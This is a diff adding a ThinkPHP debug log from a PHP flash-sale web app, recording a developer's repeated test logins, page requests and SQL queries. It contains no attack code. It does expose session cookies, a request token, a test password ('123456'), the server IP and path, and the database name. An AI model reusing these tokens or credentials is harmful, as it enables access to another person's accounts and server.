+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:52:33+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.109407s] [吞吐率：9.14req/s] [内存消耗：3,205.39kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '35',
+)
+[ info ] [ PARAM ] array (
+  'sno' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/thinkphp/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000529s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000739s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` IS NULL LIMIT 1 [ RunTime:0.000279s ]
+---------------------------------------------------------------
+[ 2021-01-12T15:53:07+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.028299s] [吞吐率：35.34req/s] [内存消耗：3,205.39kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '35',
+)
+[ info ] [ PARAM ] array (
+  'sno' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/thinkphp/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000741s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000698s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` IS NULL LIMIT 1 [ RunTime:0.000203s ]
+---------------------------------------------------------------
+[ 2021-01-12T15:53:13+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.021009s] [吞吐率：47.60req/s] [内存消耗：2,376.18kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:53:18+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.027680s] [吞吐率：36.13req/s] [内存消耗：3,205.39kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '35',
+)
+[ info ] [ PARAM ] array (
+  'sno' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/thinkphp/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000318s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000788s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` IS NULL LIMIT 1 [ RunTime:0.000228s ]
+---------------------------------------------------------------
+[ 2021-01-12T15:53:20+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/main/index
+[运行时间：0.018359s] [吞吐率：54.47req/s] [内存消耗：1,940.65kb] [文件加载：40]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'main',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T15:53:37+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/main/index
+[运行时间：0.050874s] [吞吐率：19.66req/s] [内存消耗：2,141.45kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'main',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'cookie' => 'Path=/www/wwwroot/101.37.13.45/application/customer/view; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Main->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Main.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/main/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:26+08:00 ] 115.27.214.243 GET 101.37.13.45/index.php/customer/login/index.html
+[运行时间：0.037263s] [吞吐率：26.84req/s] [内存消耗：2,371.00kb] [文件加载：43]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\customer\controller\Login->index[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/customer/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:39+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.032845s] [吞吐率：30.45req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:41+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.017544s] [吞吐率：57.00req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:41+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018796s] [吞吐率：53.20req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:41+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.020239s] [吞吐率：49.41req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:42+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019041s] [吞吐率：52.52req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:42+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018507s] [吞吐率：54.03req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:42+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018161s] [吞吐率：55.06req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:42+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.021912s] [吞吐率：45.64req/s] [内存消耗：2,138.99kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:36:42+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.017777s] [吞吐率：56.25req/s] [内存消耗：2,138.99kb] [文件加载：39]
